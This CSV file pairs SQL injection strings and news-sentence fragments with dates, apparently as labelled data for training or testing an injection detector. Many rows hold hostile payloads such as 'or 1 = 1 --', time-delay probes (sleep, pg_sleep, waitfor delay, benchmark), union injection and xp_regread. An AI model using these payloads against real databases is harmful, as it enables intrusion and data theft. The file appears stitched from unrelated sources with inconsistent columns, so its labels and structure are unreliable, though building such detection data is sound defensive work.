Queries,Date
OR SLEEP(5),2016-01-17
select,2016-01-18
And 1=1,2016-01-03
hello my name is,2016-01-14
or' 1=1,2016-01-17
admin,2016-01-17
server,2016-01-06
Where does it come from?,2016-01-25
sections 1.10.32 and 1.10.33,2016-01-21
"injected humour,",2016-01-10
UPDATE,2016-01-27
"a,1",2016-01-18
"a' ,1",2016-01-17
"a' --,1",2016-01-02
"a' or 1 = 1; --,1",2002-05-03
"@,1",2002-05-06
"?,1",2002-05-04
"' and 1 = 0 )  union all,1",2002-05-10
"? or 1 = 1 --,1",2002-05-01
"x' and userid is NULL; --,1",2002-05-05
" However , regard winning run , Rangnick sang team &apos;s praises ,0",2002-05-04
" &quot; There two words it: Really good , &quot; stated ,0",2002-05-04
" There lot criticise ,0",2002-05-08
" Most , manner team playing impressive ,0",2002-05-09
" We must stay composed keep ,0",2002-05-07
" There hardly squad changes winter transfer window ,0",2002-05-10
" There major reason change anything ,0",2002-05-10
" &quot; Unless player comes forward expresses desire leave club , &quot; explained Rangnick ,0",2002-05-09
" Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog ,0",2002-05-06
" Former NSW minister Joe Tripodi denied changing maritime leases policy request political mentor Eddie Obeid , hidden interests three properties government-controlled land ,0",2002-05-07
" The Independent Commission Against Corruption (ICAC) Friday widened inquiry whether Mr Obeid lobbied several state ministers leases Circular Quay , Obeids owned two restaurants cafe , renewed without going tender expiration August 2005 ,0",2002-05-09
" It &apos;s investigating allegations Mr Tripodi knew Mr Obeid &apos;s secret interest properties , evidence given Mr Tripodi &apos;s former deputy chief staff , Lynne Ashpole , Thursday ,0",2002-05-09
" During years discussions starting 2005 government pushing leases go public tender ,0",2002-05-04
" The lessees also wanted longer terms ,0",2002-05-02
" In 2009 leases Circular Quay enterprises , earned Obeids $ 2,0",2002-05-10
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2002-05-07
"asc,1",2018-08-20
" ( ||6 ) ,1",2018-08-12
"""a"""" or 3 = 3--"",1",2018-08-31
""" or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2018-08-30
"# from wapiti,1",2018-08-13
" or 0 = 0 --,1",2018-08-09
"1 waitfor delay '0:0:10'--,1",2018-08-18
"delete,1",2018-08-21
"like,1",2018-08-21
""" or sleep ( __TIME__ ) #,1",2018-08-15
"pg_sleep ( __TIME__ ) --,1",2018-08-13
"* ( | ( objectclass = *  )  )  ,1",2018-08-14
"declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1",2018-08-08
" or 0 = 0 #,1",2018-08-17
"insert,1",2018-08-23
"1 )  or sleep ( __TIME__ ) #,1",2018-08-10
" )  or  ( 'a' = 'a,1",2018-08-23
"; exec xp_regread,1",2018-08-16
"*|,1",2018-08-09
"@var select @var as var into temp end --,1",2018-08-03
